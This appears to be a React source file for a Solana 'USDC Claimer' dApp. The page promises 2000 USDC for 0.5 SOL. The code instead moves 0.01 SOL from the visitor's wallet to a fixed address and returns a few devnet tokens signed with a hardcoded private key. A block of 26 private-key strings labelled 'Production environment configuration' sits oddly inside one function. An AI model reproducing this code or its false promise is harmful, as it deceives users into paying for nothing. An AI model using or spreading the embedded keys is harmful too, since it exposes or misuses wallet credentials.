/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5pqHfwfYyHNyccScvghaGfqzk2oLVJpB49RgUYXW3BH2hhuAFN7psNrsYcatmwpi6oieditjCGcBFDCMb7feR95F"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5TtaZKnx27MtYxn5k5nnjDAEiBiPzhMGzGwjiiddYpLa7ZRMfiC7UEaPybHMKYADsYemJat564V9kygnFtN3woPe",
  "key1": "4ozJMidSaZb7paM8pKXwDkbt5dnP8GRW6Qr5NAonDUbsEfxiAWLzDgnKJgQTJjnG5tzWmVSKb4kFjURCcMcUhPrR",
  "key2": "2ryCmTtZq2Z66Xkw56bzzWGz1YeLrYJPdzmKpMWMC8qAzKzNoXD3S46AdRtMqz36biimfPnRPSBbBocDVABex2vm",
  "key3": "5Kc99Y4tErGfXtg5k3qF35zou1RLZh2LgVzG6T5AFXDg43yrSD312XXf4TAfLRRoFmn8iWxdULAKSoRTqHK1u28x",
  "key4": "4ro7UJ9qmYKWYQ8JCKvj8GN3BGFjtGF728234z1CGSz1S7ATRtK5cpkqhoQntM8eMwbDQWD4dp6bEdi1MntN5mcb",
  "key5": "3RtEQZNUdRef6yw1hGhB1yKPhZ8RjFzX49rEgP6FtrpuGLSoy67YJ95Z4RpY2Gc981CVXuzhbPBgm1QqRNd4tihE",
  "key6": "5Kxno21n7TfVP1U8oSj39MrtZStVspnqPh2jMKAp2Fdnujh1qo23FtThM4RJeRWtCW5yvSaKkLpCkdBvXuyShEmp",
  "key7": "37paFq3F5M55pV9FN9nE54R2VDzwg2ybwYPFhLWs3W2ksujDgYsP9EP9Bs5svYys4Zuvb6gPYpoCERix9BobthLk",
  "key8": "LdUnm2EiCRZzbStZq9bUK8teMomc96cr2GRbPSxxLTLjygETJoGyJEyAHy5tKv452C33s1LAVeTZHFo3FJAQtux",
  "key9": "4TceugQQe3dr5PUbhDJfQvAh9fa62LfEd1A69xWhxwHxY73zfVjgKTd9MqkoWxaLWE8kqtjYpdS7h5HCcSSoqNH5",
  "key10": "2ZUCT1w4gR32kui8XfxYRtjY3qXm2qJxAG7NCwyi3vCFAzefrSe1j6FWc6qALv1N2REbeD4JhiJzDCxjqeXNyWQB",
  "key11": "vHjgP9Z6bxzcKDnwAg6xvtq8SbXd5yMXd9v8QCwbofYdBk3dGcQ22v7h9r3gokX8FqXCXs9rjXDTtkjuDaHL5N2",
  "key12": "2Ff1hHc9eUoVkPXzZ6Urh7A6qW5tYfC2BavGsXQB9pCbCiyVr8xq2m41TNxVYn825xbGQGC4W81aGCSsLcNmU3rM",
  "key13": "5DzZpNFi3AHFg3gTqvPGsijvMwqqoHnrnWxk574SeohKuHaLsDTtgTok7CDqV5DzGvHQbwvXePP54TaFEX2AXq7P",
  "key14": "jv3kSDsvwbvS4cqfjPGYawwNwFrLsXoAfnTq2J3Fr7ihxaQGa2iEgnW5ZyWXrARfocZb67LDXPPcMLANDSf7KWo",
  "key15": "3yYWs38QRMT8s47kAegFCKW7DqvhEFLbbdvutkfXkqaZh3ePArguAWBV56R2d5qmeS1Hwag679v6hb7rQzdrnxhP",
  "key16": "5sTSWrXaPZvP3zf6BLuJborwKgPh2ggWA98WBLoEVxTonfdc1CNSupdMbukRUjLCG3aVeHP1rG1S6biwQ28BnxNB",
  "key17": "3aANXBQVrZjaBCtqSWz1zWHUwqnQMQ1iEPW4TNfe139vD8JV4HCQ6TkukVySopnEQtseAqWLehtUutqResgUfREm",
  "key18": "26jApt5Bo9J3wMBxR4cTgZ1TEhxgfe2ycFkVpzwHMPxFrGQHNu1grL9LeiWHD7oJExjTx5Mu6kzjJ3NHTZ8NKEPC",
  "key19": "56LF9yax9Y4UAZMgauY4nB1pEKn8j76HycXo4Tndtq9isWmEu1Ep93wxG976j7bFjME9pnZtkytwSZBDDizTVv4i",
  "key20": "2XFriTSw9qbCNh1Lusu1Z2K96gV2r8DNjv7mgUc9S4MZYnFstFwvpg6jn98YkfYNRAkCcAw96FKQg4TTsVCX1857",
  "key21": "4ALUxx3ehpup44VLZph5roWjEmRdR41HVXPNgojq25teXjt41uPaKnfiwJhsX4fLNYZZs2EXjPdX6dwGRAdfecoX",
  "key22": "2jiVK4CYZtvby64pxhSrMxC2SuAE8gF7MAXTFXYmfDix2oBrjbSWdj2Y6eUCRMVxX4iPbzXNH7DY3C1sDZG5pfTy",
  "key23": "3yyG4uN2fvmZnQpfMVEnkgzgzoBzxBHjQKqoWo6ekvPwM6Uc9bVBiqnMfVArpZ8hQMtQNi1XceummfqEXnUxfbcp",
  "key24": "43Z1KcF8FMZLJ78zdPe8cLTATdTb6jPfN7eLfsaqQMNjW9eNQvhbRRrT9he9TeSRCdG4PVAxkmAnTsby4XNeKM3g",
  "key25": "4e6MztdFzCTfT869SCZ6gTzcoYHV1EVsniySsQQJnhNGsnjykGapFvPvWN5dCPPLAUL2c24QiLGDBAcWViGQN6Uy"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
